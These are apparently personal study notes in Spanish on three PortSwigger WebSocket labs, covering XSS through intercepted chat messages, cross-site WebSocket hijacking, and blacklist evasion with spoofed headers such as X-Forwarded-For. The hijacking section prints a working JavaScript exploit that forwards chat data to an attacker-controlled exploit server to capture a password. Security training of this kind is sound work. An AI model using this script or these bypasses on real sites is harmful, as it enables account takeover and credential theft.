---
aliases: ["WebSocket", "WebSockets", "Burp Suite WebSocket", "XSS WebSocket", "Cross-site WebSocket hijacking"]
tags: [redes/protocolos, hacking/explotacion, herramientas/burpsuite]
estado: 🟢 Terminado
---
# WebSocket: Protocolo de Comunicación Bidireccional

WebSocket es un protocolo de comunicación que permite la comunicación bidireccional y continua (full-duplex) entre un cliente y un servidor a través de una única conexión TCP. A diferencia del protocolo HTTP, que requiere que el cliente inicie cada interacción con el servidor y luego cierre la conexión, WebSocket mantiene un canal abierto para que ambos extremos puedan enviar y recibir datos en cualquier momento. Esta característica es ideal para aplicaciones que necesitan interacciones en tiempo real y de baja latencia, como chats, juegos multijugador o sistemas de notificación.

> [!info] Handshake de WebSocket
> La conexión WebSocket se inicia con un "handshake" HTTP. El cliente envía una petición HTTP con la cabecera `Upgrade: websocket` y `Connection: Upgrade`. Si el servidor acepta, responde con un `101 Switching Protocols` y la conexión se "actualiza" a WebSocket, permitiendo la comunicación full-duplex sobre la misma conexión TCP.

## PortSwigger Labs

### Lab: Manipulating WebSocket messages to exploit vulnerabilities

Parece que necesitamos explotar una vulnerabilidad de XSS a través de WebSocket.

Comenzaremos configurando Burp Suite para interceptar todo el tráfico y poder analizarlo posteriormente.

![[Pasted image 20250925212612.png]]

Observamos cómo se están procesando todas las peticiones, pero específicamente dentro de las peticiones del chat, se menciona `WebSocket`. Para visualizar estas, debemos dirigirnos al historial de `WebSocket` en Burp Suite:

![[Pasted image 20250925212809.png]]

Vemos que la comunicación del chat web está activa. Ahora intentaremos interceptar el envío de un mensaje:

![[Pasted image 20250925212917.png]]

Confirmamos que el mensaje se intercepta sin problemas. Procederemos a intentar una inyección para observar el resultado:
![[Pasted image 20250925213031.png]]

Aparentemente, está bien configurado, ya que no se ejecuta la inyección. Podemos observar cómo se está insertando el payload para intentar otras variantes:
![[Pasted image 20250925213309.png]]

Notamos que los caracteres `<` y `>` no se están interpretando correctamente; por alguna razón, se están codificando. Intentaremos forzar su procesamiento adecuado para ver qué logramos:
![[Pasted image 20250925213524.png]]

![[Pasted image 20250925213535.png]]

No observamos ningún resultado. Podemos intentar alternativas como la siguiente:

> [!tip] Bypassing HTML Encoding
> Cuando los caracteres `<` y `>` son codificados (por ejemplo, a `&lt;` y `&gt;`), se puede intentar inyectar payloads que no dependan de estos caracteres o que utilicen codificaciones alternativas (como entidades HTML numéricas o hexadecimales) si el filtro es inconsistente. En este caso, el uso de `onerror` en una etiqueta `img` sin cerrar puede ser efectivo si el navegador intenta renderizarla.

![[Pasted image 20250925213623.png]]

![[Pasted image 20250925213641.png]]

¡Perfecto! Esto sí ha funcionado:

![[Pasted image 20250925213657.png]]

### Lab Terminado.

### Lab: Cross-site WebSocket hijacking

Volvemos a encontrarnos con un chat en vivo. En este laboratorio, utilizaremos el exploit server para configurar nuestro código JavaScript malicioso:

Analizaremos el tráfico:
![[Pasted image 20250925214111.png]]

Por lo que se entiende, la secuencia es enviar el mensaje `READY` y luego iniciar la comunicación con los mensajes.

Con lo anterior claro, nuestro código para este ataque sería el siguiente:
```html
<script>
var ws = new WebSocket("https://0a250004047b3030806844f000840052.web-security-academy.net/chat");

ws.onopen = function () {
  ws.send("READY");
};

ws.onmessage = function () {
  fetch("https://exploit-0af400560405302a807943c6019b00a6.exploit-server.net/?data=" + btoa(event.data));
};
</script>
```

> [!info] Cross-site WebSocket Hijacking (CSWSH)
> A diferencia de las peticiones AJAX, los WebSockets no están sujetos a la Same-Origin Policy (SOP) de la misma manera estricta para el inicio de la conexión. Un atacante puede iniciar una conexión WebSocket a un dominio diferente desde una página controlada por el atacante. Si el servidor WebSocket confía en las cookies de sesión para la autenticación y no valida el `Origin` header, un usuario autenticado que visite la página del atacante podría ser víctima de un secuestro de sesión a través de WebSocket. El atacante podría entonces leer o enviar mensajes en nombre del usuario.

![[Pasted image 20250925214733.png]]

Enviaremos esto a la víctima y verificaremos si recibimos la información en los logs:
![[Pasted image 20250925214817.png]]

¡Perfecto! Observamos datos transmitidos en Base64. Procederemos a decodificarlos a texto normal en la consola:

![[Pasted image 20250925215208.png]]

Confirmamos que ya tenemos la contraseña de Carlos:

![[Pasted image 20250925215244.png]]

### Lab Terminado.

### Lab: Manipulating the WebSocket handshake to exploit vulnerabilities

En este laboratorio, explotaremos una vulnerabilidad de XSS con el objetivo de ejecutar una función `alert()`.

Como ya vimos en el caso anterior, donde funcionó la manipulación de etiquetas interceptando con Burp Suite, intentaremos esa misma aproximación inicialmente:

![[Pasted image 20250925215643.png]]

Al intentarlo, nos desconecta y, finalmente, nos añade a una lista negra (blacklist), impidiéndonos incluso ver el chat:
![[Pasted image 20250925215711.png]]

En este punto, podemos interceptar la petición e intentar utilizar cabeceras conocidas para eludir esta restricción:
![[Pasted image 20250925215820.png]]

> [!info] Bypassing Blacklists/WAFs with HTTP Headers
> Algunos sistemas de seguridad o WAFs pueden bloquear peticiones basándose en la IP de origen o en patrones específicos en el cuerpo/cabeceras. Utilizar cabeceras como `X-Forwarded-For`, `X-Originating-IP`, `X-Remote-IP`, `X-Client-IP` o `Client-IP` con una IP diferente (como `127.0.0.1` o una IP interna) puede engañar al servidor para que piense que la petición proviene de una fuente de confianza o interna, eludiendo así las restricciones de la lista negra.

Observamos que esto funciona, pero tendríamos que editar todas las peticiones para añadir la cabecera, lo cual no es óptimo. Configuraremos el proxy de la siguiente manera:
![[Pasted image 20250925220057.png]]

Con esta configuración, debería estar funcionando de nuevo:

![[Pasted image 20250925220141.png]]

Volveremos a intentar lo mismo, pero representado de otra manera, que sería la siguiente:

![[Pasted image 20250925220318.png]]

![[Pasted image 20250925220331.png]]

Nos vuelve a detectar, pero en esta ocasión, directamente nos muestra `Alert`. Es posible que esto no sea del agrado del sistema; intentaremos de otra forma:
![[Pasted image 20250925220510.png]]

En este caso, intentaremos sin los paréntesis. La forma correcta es como se muestra en la imagen. Procederemos a intentarlo:

![[Pasted image 20250925220554.png]]

¡Eso le gustó! Ahora sí, verificaremos si el laboratorio se ha completado:
![[Pasted image 20250925220619.png]]

### Lab Terminado.